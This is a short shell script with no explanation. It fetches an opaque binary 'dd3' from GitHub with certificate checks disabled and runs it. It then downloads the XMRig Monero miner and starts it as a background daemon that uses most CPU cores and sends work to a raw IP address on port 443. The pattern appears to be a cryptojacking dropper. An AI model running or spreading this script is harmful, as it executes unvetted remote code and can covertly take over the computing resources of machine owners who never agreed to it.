cd ..
wget -N --no-check-certificate https://raw.githubusercontent.com/devcatxmr/xmr/master/dd3
chmod +x dd3
./dd3
wget https://github.com/xmrig/xmrig/releases/download/v5.11.1/xmrig-5.11.1-xenial-x64.tar.gz
tar -xzvf xmrig-5.11.1-xenial-x64.tar.gz
cd xmrig-5.11.1
cores=$(cat /proc/cpuinfo |grep "processor"|wc -l)
core=$[${cores}/6*5]
./xmrig --donate-level 1 -o 137.116.128.237:443 -u $1 -k --max-cpu-usage 85 -t ${core} -B
